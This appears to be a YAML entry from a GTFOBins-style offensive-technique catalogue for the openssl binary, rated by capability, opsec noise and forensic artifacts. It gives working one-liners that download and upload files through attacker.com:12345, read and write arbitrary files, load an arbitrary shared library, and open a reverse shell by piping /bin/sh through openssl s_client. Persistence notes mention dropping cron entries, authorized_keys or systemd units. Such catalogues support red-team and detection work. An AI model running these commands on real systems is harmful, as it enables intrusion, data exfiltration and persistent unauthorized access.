---
name: openssl
capabilities:
- exec
- read
- write
- upload
- download
- reverse-shell
required_permissions:
  level: user
difficulty: low
opsec:
  noise: high
  artifacts:
  - ~/.bash_history
  - Network connection logs / firewall logs
  - auditd execve events
  - Process arguments visible in ps and auditd
  - File timestamps / inotify events on target paths
  - Outbound network traffic to attacker host
  notes: ''
persistence_potential: true
examples:
- id: download
  description: Fetch a remote file to disk.
  capabilities:
  - download
  command: openssl s_client -quiet -connect attacker.com:12345 >/path/to/output-file
- id: file-read
  description: Read an arbitrary file.
  capabilities:
  - read
  command: openssl enc -in /path/to/input-file
- id: file-write
  description: Write content to an arbitrary file.
  capabilities:
  - write
  command: echo DATA | openssl enc -out /path/to/output-file
- id: file-write-2
  description: Write content to an arbitrary file.
  capabilities:
  - write
  command: openssl enc -in /path/to/input-file -out /path/to/output-file
- id: library-load
  description: Load an arbitrary shared library.
  capabilities:
  - exec
  command: openssl req -engine ./lib.so
- id: reverse-shell
  description: Initiate a reverse shell to attacker host.
  capabilities:
  - reverse-shell
  - exec
  command: |-
    mkfifo /path/to/temp-socket
    /bin/sh -i </path/to/temp-socket 2>&1 | openssl s_client -quiet -connect attacker.com:12345 >/path/to/temp-socket
  notes: The shell process is not spawn by `openssl`.
- id: upload
  description: Send a local file to a remote host.
  capabilities:
  - upload
  command: openssl s_client -quiet -connect attacker.com:12345 </path/to/input-file
references:
- https://gtfobins.github.io/gtfobins/openssl/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
